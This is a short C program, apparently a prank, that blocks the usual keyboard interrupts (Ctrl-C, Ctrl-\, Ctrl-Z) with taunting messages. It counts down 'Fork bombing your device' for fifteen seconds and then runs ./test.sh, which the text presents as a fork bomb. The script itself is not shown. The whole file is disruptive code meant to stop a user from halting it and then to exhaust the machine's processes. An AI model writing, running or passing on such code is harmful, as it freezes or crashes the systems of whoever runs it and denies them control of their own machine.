#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/wait.h>
#include <ctype.h>
#include <sys/types.h>
#include <fcntl.h>
#include <signal.h>

int next = 15;

void interrupt(int s) {
    switch (s) {
    case SIGINT:
        printf("\nnoo, don't interrupt me :3\n");
        break;
    case SIGQUIT:
        printf("\nI don't wanna quit :(\n");
        break;
    case SIGTSTP:
        printf("\ndon't try and stop me >:3\n");
        break;
    default:
        printf("hmm... unexpected interrupt...\n");
    }
}

int main(int argc, char *argv[]) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = interrupt;
    sigaction(SIGINT, &sa, 0);
    sigaction(SIGQUIT, &sa, 0);
    sigaction(SIGTSTP, &sa, 0);
    
    while (true) {
        sleep(1.5);
        printf("Haiii :3\n");
        printf("Fork bombing your device in %d!!!\n", next);
        if (next == 0) {
            printf("Fork bomb time :3\n");
            goto forkbomb;
        }
        next -= 1;
    }
forkbomb:
    system("./test.sh");
    return (0);
}
